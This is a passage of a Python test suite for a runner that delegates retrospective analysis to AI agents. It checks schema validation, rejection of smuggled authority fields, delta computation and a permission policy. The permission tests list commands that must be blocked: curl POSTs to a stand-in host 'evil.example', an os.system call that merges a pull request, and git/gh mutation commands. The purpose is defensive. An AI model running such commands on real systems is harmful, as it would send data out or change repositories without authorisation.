    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {
            "type": "result",
            "subtype": "success",
            "is_error": False,
            "result": json.dumps(business_payload),
            "structured_output": "not-a-dict",
        }
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "malformed_output"
    assert result.reason_code == "missing_structured_output"


def test_fix_delta_p01_present_dict_structured_output_takes_priority_over_result(tmp_path: Path) -> None:
    schema_path = _compat_schema(tmp_path)
    dict_payload = {"a": "from-structured-output-dict"}
    mismatched_result_payload = {"a": "from-result-should-be-ignored"}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {
            "type": "result",
            "subtype": "success",
            "is_error": False,
            "result": json.dumps(mismatched_result_payload),
            "structured_output": dict_payload,
        }
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "ok"
    assert result.structured_output == dict_payload
    assert result.structured_output != mismatched_result_payload


def test_fix_delta_p01_result_failing_schema_validation_rejected(tmp_path: Path) -> None:
    schema_path = _compat_schema(tmp_path)
    # missing the required "a" field -> fails schema validation
    non_conformant_payload = {"b": "no-required-field"}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {
            "type": "result",
            "subtype": "success",
            "is_error": False,
            "result": json.dumps(non_conformant_payload),
        }
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "malformed_output"
    assert result.reason_code == "missing_structured_output"


# ---------------------------------------------------------------------------
# fix_delta gate #4: single executable entrypoint, collectors -> PublishRequest
# ---------------------------------------------------------------------------


def test_executable_entrypoint_collectors_to_publish_request(tmp_path: Path) -> None:
    repo_root = _SCRIPTS_DIR.parents[3]
    schema_dir = tmp_path / "schemas"
    schema_dir.mkdir()
    (schema_dir / "observer_result_v1.schema.json").write_text("{}", encoding="utf-8")
    (schema_dir / "evaluation_result_v1.schema.json").write_text("{}", encoding="utf-8")

    def _git_runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        assert argv == ["git", "rev-parse", "main"]
        return subprocess.CompletedProcess(argv, returncode=0, stdout=_FULL_SHA + "\n", stderr="")

    call_log: list[str] = []
    # the expected source_set_digest is derived by running the *same*
    # collector closure `run_cli` uses, so this fake runner's fabricated
    # bundles agree with the real `prepare()` output without duplicating
    # collect_repository_source's internal observation shape by hand.
    real_observation = rr.build_repository_collector(repo_root)(_FULL_SHA).observation
    expected_digest = rr.compute_source_set_digest([real_observation])

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        agent_name = argv[argv.index("--agent") + 1]
        call_log.append(agent_name)
        if agent_name == "retrospective-evaluator":
            evaluator_request = rr.EvaluatorRequest.from_wire(kwargs["input"])
            evaluation = rr.Evaluation(
                run_id=evaluator_request.run_id,
                base_sha=_FULL_SHA,
                source_set_digest=evaluator_request.source_set_digest,
                candidate_records=[_new_candidate()],
                evidence_ref="e",
            )
            return subprocess.CompletedProcess(
                argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(evaluation.to_wire()))), stderr=""
            )
        bundle = rr.EvidenceBundle(
            run_id=kwargs["env"].get("AGENT_RETROSPECTIVE_RUN_ID", ""),
            base_sha=kwargs["env"].get("AGENT_RETROSPECTIVE_BASE_SHA", ""),
            source_set_digest=expected_digest,
            observer_id=agent_name,
            evidence_ref=f"evidence://{agent_name}",
            findings=[{"claim": f"finding from {agent_name}", "claim_class": "process"}],
        )
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(bundle.to_wire()))), stderr=""
        )

    publish_request = rr.run_cli(
        repo_root=repo_root,
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        request_id="req-cli-1",
        idempotency_key="idem-cli-1",
        schema_dir=schema_dir,
        # Issue #2345 fix_delta P1/P2: `prompts=None` exercises the
        # production `--prompts-file`-omitted default-prompt path
        # (`run_cli()` builds real-identity default prompts itself); the
        # fake `_runner` above derives observer identity from `kwargs["env"]`
        # (the same run-scoped env `run_cli()` always injects) rather than
        # prompt content, so this default-prompt path is exercised without
        # changing this test's own assertions.
        prompts=None,
        runner=_runner,
        git_runner=_git_runner,
        run_id="run-cli-1",
        temp_base_dir=tmp_path,
    )

    assert isinstance(publish_request, rr.PublishRequest)
    assert sorted(call_log) == sorted(
        [spec.observer_id for spec in rr.EXPECTED_OBSERVER_MANIFEST] + ["retrospective-evaluator"]
    )
    assert call_log[-1] == "retrospective-evaluator"  # evaluator invoked last
    assert publish_request.run_identity["run_id"] == "run-cli-1"
    assert publish_request.run_identity["base_sha"] == _FULL_SHA


# ---------------------------------------------------------------------------
# fix_delta gate #5: nested smuggled private_evidence/authority fields
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("smuggled_key", sorted(rr.SMUGGLED_AUTHORITY_KEYS))
def test_nested_private_evidence_and_authority_fields_rejected(smuggled_key: str) -> None:
    payload = json.loads(
        rr.EvaluatorRequest(
            run_id="r",
            base_sha=_FULL_SHA,
            source_set_digest="d",
            finding_sets=[{"observer_id": "o", "findings": [{"claim": "x", smuggled_key: "smuggled-value"}]}],
        ).to_wire()
    )
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.EvaluatorRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "smuggled_authority_field"


def test_nested_private_evidence_rejected_inside_candidate_records() -> None:
    # a smuggled key nested inside candidate_records[].finding_contract is
    # rejected fail-closed -- defense-in-depth: it is caught either by the
    # canonical candidate schema's own `additionalProperties: false` (the
    # evaluation sub-schema does not declare `private_evidence`) or, for a
    # key nested somewhere the candidate schema would tolerate as `Any`, by
    # the generic nested smuggled-authority-key scan.
    candidate = _new_candidate()
    candidate["finding_contract"]["evaluations"][0]["private_evidence"] = {"stdout": "raw"}
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.Evaluation(
            run_id="r", base_sha=_FULL_SHA, source_set_digest=_DIGEST, candidate_records=[candidate], evidence_ref="e"
        )
    assert excinfo.value.reason_code in ("candidate_schema_invalid", "smuggled_authority_field")


def test_nested_private_evidence_rejected_inside_run_identity() -> None:
    payload = json.loads(_sample_publish_request().to_wire())
    payload["run_identity"]["authorization_token"] = "smuggled"
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.PublishRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "smuggled_authority_field"


# ---------------------------------------------------------------------------
# fix_delta gate #6: candidate_records validate against canonical schema
# ---------------------------------------------------------------------------


def test_candidate_records_validate_current_canonical_schema() -> None:
    # a legacy-shaped (private-dialect) candidate is rejected outright
    legacy_shaped = {"finding_identity": "fid-1", "severity": "medium"}
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.Evaluation(
            run_id="r",
            base_sha=_FULL_SHA,
            source_set_digest=_DIGEST,
            candidate_records=[legacy_shaped],
            evidence_ref="e",
        )._post_validate()
    assert excinfo.value.reason_code == "candidate_schema_invalid"

    # a canonical agent_improvement_candidate/v1 record (real #2288/#2289
    # fixture, reused via load_fixture -- not a private dialect) passes
    real_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.new.valid.json")
    rr.Evaluation(
        run_id="r", base_sha=_FULL_SHA, source_set_digest=_DIGEST, candidate_records=[real_fixture], evidence_ref="e"
    )  # no raise


def test_candidate_records_validate_current_canonical_schema_rejects_duplicate_id() -> None:
    candidate = _new_candidate()
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.Evaluation(
            run_id="r",
            base_sha=_FULL_SHA,
            source_set_digest=_DIGEST,
            candidate_records=[candidate, copy.deepcopy(candidate)],
            evidence_ref="e",
        )
    assert excinfo.value.reason_code == "duplicate_identity"


# ---------------------------------------------------------------------------
# fix_delta gate #7: delta engine reuses #2289 fixtures; incomplete state
# is indeterminate (never a false "resolved")
# ---------------------------------------------------------------------------


def test_delta_uses_2289_fixtures_and_incomplete_state_is_indeterminate() -> None:
    new_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.new.valid.json")
    resolved_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.resolved.valid.json")

    # available, complete coverage: a previously-"new" finding that is no
    # longer present in the current run resolves.
    previous = rr.PreviousStateResult(
        status="available", previous_run_ref="run-0", candidates=[new_fixture], read_version="v1"
    )
    delta = rr.compute_delta(previous, [])
    assert delta == [
        {
            "finding_identity": new_fixture["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "resolved",
        }
    ]

    # a resolved finding reappearing in the current run is recurrent
    current_recurrence = copy.deepcopy(resolved_fixture)
    previous_resolved = rr.PreviousStateResult(
        status="available", previous_run_ref="run-0", candidates=[resolved_fixture], read_version="v1"
    )
    delta = rr.compute_delta(previous_resolved, [current_recurrence])
    assert delta == [
        {
            "finding_identity": resolved_fixture["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "recurrent",
        }
    ]

    # partial/stale previous-state coverage forces indeterminate -- an
    # absence observed under incomplete coverage is never reported resolved
    for incomplete_status, expected_reason in (("partial", "source_partial"), ("stale", "source_stale")):
        previous_incomplete = rr.PreviousStateResult(
            status=incomplete_status, previous_run_ref="run-0", candidates=[new_fixture], read_version="v1"
        )
        delta = rr.compute_delta(previous_incomplete, [])
        assert delta == []  # nothing currently present to classify, and no false "resolved" is fabricated

        delta_present = rr.compute_delta(previous_incomplete, [new_fixture])
        assert delta_present == [
            {
                "finding_identity": new_fixture["finding_contract"]["identity"]["value"],
                "evaluation_status": "indeterminate",
                "delta_status": None,
                "indeterminate_reason": expected_reason,
            }
        ]


def test_delta_never_uses_legacy_open_resolved_lifecycle_dialect() -> None:
    # the canonical candidate_status enum has no "open"/"resolved" values
    # (Issue #2237 P0-4) -- compute_delta must never read candidate_status
    candidate = _new_candidate()
    assert candidate["candidate_status"] not in ("open", "resolved")
    previous = rr.PreviousStateResult(status="no_history", previous_run_ref=None, candidates=[], read_version=None)
    delta = rr.compute_delta(previous, [candidate])
    assert delta == [
        {
            "finding_identity": candidate["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "new",
        }
    ]


# ---------------------------------------------------------------------------
# AC14: schema repair retry bounded to exactly 1
# ---------------------------------------------------------------------------


def test_schema_repair_retry_bounded_succeeds_after_one_repair() -> None:
    good = rr.EvidenceBundle(run_id="r", base_sha=_FULL_SHA, source_set_digest="d", observer_id="o", evidence_ref="e")
    bad_text = "{not valid json"
    repair_calls = {"n": 0}

    def _repair(text: str, error: rr.WireContractError) -> str:
        repair_calls["n"] += 1
        return good.to_wire()

    result = rr.parse_agent_output_with_repair(bad_text, rr.EvidenceBundle, repair=_repair)
    assert result == good
    assert repair_calls["n"] == 1


def test_schema_repair_retry_bounded_exhausts_after_one_retry() -> None:
    repair_calls = {"n": 0}

    def _repair(text: str, error: rr.WireContractError) -> str:
        repair_calls["n"] += 1
        return "{still not valid"

    with pytest.raises(rr.SchemaRepairExhausted):
        rr.parse_agent_output_with_repair("{not valid json", rr.EvidenceBundle, repair=_repair)
    # SCHEMA_REPAIR_RETRIES == 1 -> repair is invoked exactly once, never more
    assert repair_calls["n"] == 1
    assert rr.SCHEMA_REPAIR_RETRIES == 1


def test_schema_repair_retry_bounded_evaluator_never_started_on_exhaustion() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    evaluator_called = {"n": 0}

    def _malformed_invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
        return _ok_agent_result({"totally": "wrong-shape"})

    def _evaluator_invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        evaluator_called["n"] += 1
        raise AssertionError("evaluator must never start after schema repair exhaustion")

    with pytest.raises(rr.SchemaRepairExhausted):
        bundles = rr.run_observer_wave(ctx, plan, invoke=_malformed_invoke, observer_requests=[_observer_request("o1")])
        finding_sets = rr.build_finding_sets(ctx, plan, bundles)
        evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)
        rr.run_evaluation(ctx, evaluator_request, invoke_evaluator=_evaluator_invoke, repository_id=_REPOSITORY_ID)

    assert evaluator_called["n"] == 0


# ---------------------------------------------------------------------------
# AC15: PreviousStateProvider 5 states + delta computation
# ---------------------------------------------------------------------------


def test_previous_state_provider_five_states_status_values() -> None:
    assert rr.PREVIOUS_STATE_STATUSES == {"available", "no_history", "legacy_unavailable", "partial", "stale"}
    provider = rr.FixturePreviousStateProvider(fixtures={})
    result = provider.get(repository_id="squne121/loop-protocol", scope="global", finding_identity_algorithm="v1")
    assert result.status == "no_history"


@pytest.mark.parametrize("status", sorted(rr.PREVIOUS_STATE_STATUSES))
def test_previous_state_provider_five_states_constructible(status: str) -> None:
    result = rr.PreviousStateResult(
        status=status, previous_run_ref="run-0" if status != "no_history" else None, candidates=[], read_version=None
    )
    assert result.status == status


def test_previous_state_provider_five_states_rejects_invalid_status() -> None:
    with pytest.raises(ValueError):
        rr.PreviousStateResult(status="bogus", previous_run_ref=None, candidates=[], read_version=None)


def test_previous_state_provider_five_states_delta_new_from_no_history() -> None:
    previous = rr.PreviousStateResult(status="no_history", previous_run_ref=None, candidates=[], read_version=None)
    candidate = _new_candidate()
    delta = rr.compute_delta(previous, [candidate])
    assert delta == [
        {
            "finding_identity": candidate["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "new",
        }
    ]


def test_previous_state_provider_five_states_delta_legacy_unavailable_is_new() -> None:
    previous = rr.PreviousStateResult(
        status="legacy_unavailable", previous_run_ref=None, candidates=[], read_version=None
    )
    candidate = _new_candidate()
    delta = rr.compute_delta(previous, [candidate])
    assert delta == [
        {
            "finding_identity": candidate["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "new",
        }
    ]


def test_previous_state_provider_five_states_delta_unchanged() -> None:
    candidate = _new_candidate()
    previous = rr.PreviousStateResult(
        status="available", previous_run_ref="run-0", candidates=[candidate], read_version="v1"
    )
    delta = rr.compute_delta(previous, [candidate])
    assert delta == [
        {
            "finding_identity": candidate["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "unchanged",
        }
    ]


def test_previous_state_provider_five_states_delta_recurrent() -> None:
    resolved_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.resolved.valid.json")
    previous = rr.PreviousStateResult(
        status="stale" if False else "available",
        previous_run_ref="run-0",
        candidates=[resolved_fixture],
        read_version="v1",
    )
    delta = rr.compute_delta(previous, [copy.deepcopy(resolved_fixture)])
    assert delta == [
        {
            "finding_identity": resolved_fixture["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "recurrent",
        }
    ]


def test_previous_state_provider_five_states_delta_resolved() -> None:
    candidate = _new_candidate()
    previous = rr.PreviousStateResult(
        status="available", previous_run_ref="run-0", candidates=[candidate], read_version="v1"
    )
    delta = rr.compute_delta(previous, [])
    assert delta == [
        {
            "finding_identity": candidate["finding_contract"]["identity"]["value"],
            "evaluation_status": "classified",
            "delta_status": "resolved",
        }
    ]


# ---------------------------------------------------------------------------
# AC16: PublishRequest forbidden fields
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("forbidden_field", sorted(rr.PUBLISH_REQUEST_FORBIDDEN_FIELDS))
def test_publish_request_forbidden_fields_rejected(forbidden_field: str) -> None:
    payload = json.loads(_sample_publish_request().to_wire())
    payload[forbidden_field] = "smuggled-authority"
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.PublishRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "unknown_field"


def test_publish_request_forbidden_fields_valid_envelope_accepted() -> None:
    instance = _sample_publish_request()
    parsed = rr.PublishRequest.from_wire(instance.to_wire())
    expected_keys = {
        "schema_version",
        "request_id",
        "repository_id",
        "target_issue",
        "run_identity",
        "candidate_records",
        "expected_previous_digest",
        "idempotency_key",
        "public_projection_digest",
        "authorization_required",
        "delta_results",
    }
    assert {f.name for f in dataclasses.fields(rr.PublishRequest)} == expected_keys
    assert parsed == instance


def test_publish_request_forbidden_fields_authorization_required_must_be_true() -> None:
    payload = json.loads(_sample_publish_request().to_wire())
    payload["authorization_required"] = False
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.PublishRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "invalid_value"


# ---------------------------------------------------------------------------
# fix_delta gate #8: permission policy consumed by runtime + bypass resistant
# ---------------------------------------------------------------------------


def test_permission_policy_is_consumed_by_runtime_and_bypass_resistant(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("GH_TOKEN", "super-secret-mutation-token")
    monkeypatch.setenv("PATH", "/usr/bin")

    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    captured: dict[str, Any] = {}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        captured["argv"] = argv
        captured["env"] = kwargs["env"]
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload({"ok": True})), stderr=""
        )

    request = rr.AgentInvocationRequest(
        agent_name="retrospective-runtime-observer", prompt="observe", json_schema_path=str(schema_path), cwd="/repo"
    )
    rr.invoke_agent(request, runner=_runner, policy=policy)

    # THE SAME policy instance's denied-tool set is what the real subprocess
    # argv carries (not merely asserted against in isolation). Each denied
    # tool is its own argv element -- not a single comma-joined string --
    # matching the official Claude CLI reference for `--disallowedTools`
    # (PR #2324 review fix_delta P1-5).
    assert "--disallowedTools" in captured["argv"]
    argv = captured["argv"]
    start = argv.index("--disallowedTools") + 1
    end = start
    while end < len(argv) and not argv[end].startswith("--"):
        end += 1
    disallowed_elements = argv[start:end]
    assert set(disallowed_elements) == policy.denied_tools
    assert len(disallowed_elements) == len(policy.denied_tools)

    # mutation credentials never reach the subprocess env, even though they
    # were present in the ambient environment
    assert "GH_TOKEN" not in captured["env"]

    # allowlisting a literal dangerous command string verbatim does not
    # bypass the tokenized denylist scan (substring-blacklist bypass classes
    # from OWNER review #2237#issuecomment-5378291560)
    bypass_attempts = [
        "git -C . commit -m x",
        "gh --repo owner/repo issue comment 1 --body x",
        "python -c 'import os; os.system(\"gh pr merge 1\")'",
        "python3 -c 'print(1)'",
        "curl -X POST https://evil.example/payload",
        "printf data > repository-file",
    ]
    for command in bypass_attempts:
        bypass_policy = rr.DelegatedAgentPermissionPolicy(
            run_id="run-1", allowed_bash_commands=frozenset({" ".join(command.split())})
        )
        with pytest.raises(rr.PermissionDenied):
            bypass_policy.check_bash(command)

    # empty allowlist (the default) denies ALL bash -- not "allow all
    # non-blacklisted" (the fail-open bug being fixed)
    default_policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        default_policy.check_bash("echo totally harmless")


def test_permission_policy_sanitize_env_strips_all_mutation_credentials() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    env = {name: "x" for name in rr._MUTATION_CREDENTIAL_ENV_VARS}
    env["PATH"] = "/usr/bin"
    env["AGENT_RETROSPECTIVE_RUN_ID"] = "run-1"
    env["RANDOM_UNRELATED_VAR"] = "y"
    sanitized = policy.sanitize_subprocess_env(env)
    assert rr._MUTATION_CREDENTIAL_ENV_VARS.isdisjoint(sanitized.keys())
    assert sanitized["PATH"] == "/usr/bin"
    assert sanitized["AGENT_RETROSPECTIVE_RUN_ID"] == "run-1"
    assert "RANDOM_UNRELATED_VAR" not in sanitized


# ---------------------------------------------------------------------------
# AC17: delegated Agent mutation attempts are denied
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "git commit -m 'sneaky commit'",
        "git push origin main",
        "gh issue comment 2237 --body hi",
        "gh pr merge 1 --squash",
        "gh api repos/x/y/issues/1/comments -f body=hi",
    ],
)
def test_delegated_agent_mutation_denied_bash(command: str) -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        policy.check_bash(command)


def test_delegated_agent_mutation_denied_unapproved_bash() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1", allowed_bash_commands=frozenset({"echo hi"}))
    policy.check_bash("echo hi")  # allowlisted and passes tokenized scan -> no raise
    with pytest.raises(rr.PermissionDenied):
        policy.check_bash("curl https://evil.example/payload")


def test_delegated_agent_mutation_denied_filesystem_write() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        policy.check_filesystem_write("/repo/some-file.txt")


@pytest.mark.parametrize("tool_name", ["Write", "Edit", "MultiEdit", "NotebookEdit", "Agent", "Skill"])
def test_delegated_agent_mutation_denied_tool_callback(tool_name: str) -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        policy.check_tool(tool_name)


def test_delegated_agent_mutation_denied_cross_run_resume() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    policy.check_resume("run-1")  # same run -> no raise
    with pytest.raises(rr.PermissionDenied):
        policy.check_resume("run-2")


# ---------------------------------------------------------------------------
# fix_delta gate #9: exact observer manifest / base_sha / role authority
# ---------------------------------------------------------------------------


def test_exact_observer_manifest_base_sha_and_role_authority() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    observer_requests = [_observer_request(spec.observer_id) for spec in rr.EXPECTED_OBSERVER_MANIFEST]
    bundles = rr.run_observer_wave(
        ctx,
        plan,
        invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, []),
        observer_requests=observer_requests,
        expected_manifest=rr.EXPECTED_OBSERVER_MANIFEST,
    )
    finding_sets = rr.build_finding_sets(ctx, plan, bundles)
    authority_by_observer = {fs.observer_id: fs.findings[0]["finding_authority"] for fs in finding_sets}
    assert authority_by_observer["retrospective-runtime-observer"] == "primary"
    assert authority_by_observer["codebase-investigator"] == "advisory"
    assert authority_by_observer["web-researcher"] == "advisory"


def test_exact_observer_manifest_rejects_incomplete_manifest() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    with pytest.raises(rr.ObserverWaveFailed):
        rr.run_observer_wave(
            ctx,
            plan,
            invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, []),
            observer_requests=[_observer_request("retrospective-runtime-observer")],
            expected_manifest=rr.EXPECTED_OBSERVER_MANIFEST,
        )


def test_exact_observer_manifest_rejects_duplicate_observer_id() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    with pytest.raises(rr.ObserverWaveFailed):
        rr.run_observer_wave(
            ctx,
            plan,
            invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, []),
            observer_requests=[
                _observer_request("retrospective-runtime-observer"),
                _observer_request("retrospective-runtime-observer"),
            ],
        )


def test_exact_observer_manifest_rejects_base_sha_mismatch() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    wrong_sha_invoke = _make_observer_invoke(ctx.run_id, plan.source_set_digest, [], base_sha=_OTHER_SHA)
    with pytest.raises(rr.ObserverWaveFailed):
        rr.run_observer_wave(
            ctx, plan, invoke=wrong_sha_invoke, observer_requests=[_observer_request("retrospective-runtime-observer")]
        )


# ---------------------------------------------------------------------------
# fix_delta gate #10: web finding re-collected and digest-bound
# ---------------------------------------------------------------------------


def test_web_result_is_recollected_and_digest_bound() -> None:
    ctx, plan, results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[
            lambda base_sha: _fake_collector_result("repository", base_sha),
            lambda base_sha: _fake_collector_result("web", base_sha, digest="sha256:" + "c" * 64),
        ],
        run_id="run-1",
    )
    registry = rr.build_source_digest_registry(results)
    assert registry["web"] == "sha256:" + "c" * 64

    bound_bundle = rr.EvidenceBundle(
        run_id=ctx.run_id,
        base_sha=ctx.base_sha,
        source_set_digest=plan.source_set_digest,
        observer_id="web-researcher",
        evidence_ref="e",
        findings=[{"claim": "url discovered", "evidence_digest": "sha256:" + "c" * 64}],
    )
    finding_sets = rr.build_finding_sets(ctx, plan, [bound_bundle], source_digest_registry=registry)
    assert finding_sets[0].findings[0]["finding_authority"] == "advisory"  # discovery role is never promoted to primary

    unbound_bundle = rr.EvidenceBundle(
        run_id=ctx.run_id,
        base_sha=ctx.base_sha,
        source_set_digest=plan.source_set_digest,
        observer_id="web-researcher",
        evidence_ref="e",
        findings=[{"claim": "url discovered", "evidence_digest": "sha256:" + "0" * 64}],
    )
    with pytest.raises(rr.UnboundEvidenceAuthority):
        rr.build_finding_sets(ctx, plan, [unbound_bundle], source_digest_registry=registry)


# ---------------------------------------------------------------------------
# fix_delta gate #11: public_projection_digest binds source + concurrency
# ---------------------------------------------------------------------------


def test_public_projection_digest_binds_source_and_concurrency_state() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    evaluation = rr.Evaluation(
        run_id=ctx.run_id,
        base_sha=_FULL_SHA,
        source_set_digest=plan.source_set_digest,
        candidate_records=[],
        evidence_ref="e",
    )
    baseline = rr.finalize(
        ctx, plan, evaluation, repository_id="r", target_issue=1, request_id="req", idempotency_key="idem"
    )

    # changing source_set_digest (holding run_id/base_sha fixed) changes the digest
    other_plan = dataclasses.replace(plan, source_set_digest="f" * 64)
    other_source_digest = rr.finalize(
        ctx, other_plan, evaluation, repository_id="r", target_issue=1, request_id="req", idempotency_key="idem"
    )
    assert other_source_digest.public_projection_digest != baseline.public_projection_digest

    # changing expected_previous_digest (the concurrency token) changes the digest
    with_concurrency_token = rr.finalize(
        ctx,
        plan,
        evaluation,
        repository_id="r",
        target_issue=1,
        request_id="req",
        idempotency_key="idem",
        expected_previous_digest="sha256:" + "9" * 64,
    )
    assert with_concurrency_token.public_projection_digest != baseline.public_projection_digest

    # changing base_sha (single-bit change to run_identity) changes the digest
    other_run_id_ctx = rr.RunContext(base_sha_resolver=lambda: _OTHER_SHA, run_id=ctx.run_id)
    other_base_sha = rr.finalize(
        other_run_id_ctx, plan, evaluation, repository_id="r", target_issue=1, request_id="req", idempotency_key="idem"
    )
    assert other_base_sha.public_projection_digest != baseline.public_projection_digest


# ---------------------------------------------------------------------------
# AC18 / fix_delta gate #12: run-scoped temp artifact dir cleanup on all
# exit paths, and cleanup failure surfaces rather than being swallowed
# ---------------------------------------------------------------------------


def test_temp_artifact_cleanup_all_paths_success(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with rr.run_scoped_temp_dir("run-success", base_dir=tmp_path) as path:
        created_path_holder["path"] = path
        assert path.is_dir()
        assert (path.stat().st_mode & 0o777) == 0o700
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_exception(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with pytest.raises(ValueError):
        with rr.run_scoped_temp_dir("run-exception", base_dir=tmp_path) as path:
            created_path_holder["path"] = path
            raise ValueError("boom")
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_sigint(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with pytest.raises(rr.RunInterrupted) as excinfo:
        with rr.run_scoped_temp_dir("run-sigint", base_dir=tmp_path) as path:
            created_path_holder["path"] = path
            os.kill(os.getpid(), signal.SIGINT)
    assert excinfo.value.signum == signal.SIGINT
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_sigterm(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with pytest.raises(rr.RunInterrupted) as excinfo:
        with rr.run_scoped_temp_dir("run-sigterm", base_dir=tmp_path) as path:
            created_path_holder["path"] = path
            os.kill(os.getpid(), signal.SIGTERM)
    assert excinfo.value.signum == signal.SIGTERM
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_restores_previous_handlers(tmp_path: Path) -> None:
    previous_sigint = signal.getsignal(signal.SIGINT)
    previous_sigterm = signal.getsignal(signal.SIGTERM)
    with rr.run_scoped_temp_dir("run-restore", base_dir=tmp_path):
        pass
    assert signal.getsignal(signal.SIGINT) == previous_sigint
    assert signal.getsignal(signal.SIGTERM) == previous_sigterm


def test_temp_scope_is_on_production_path_and_cleanup_failure_surfaces(tmp_path: Path) -> None:
    # THEN run_cli's temp scope is the *same* run_scoped_temp_dir primitive
    # (not a separate, untested code path) -- verified by observing the
    # directory exist during the run and be gone after, keyed by the exact
    # run_id run_cli was given.
    schema_dir = tmp_path / "schemas"
    schema_dir.mkdir()
    (schema_dir / "observer_result_v1.schema.json").write_text("{}", encoding="utf-8")
    (schema_dir / "evaluation_result_v1.schema.json").write_text("{}", encoding="utf-8")
    temp_base = tmp_path / "temp-base"
    temp_base.mkdir()
    repo_root = _SCRIPTS_DIR.parents[3]

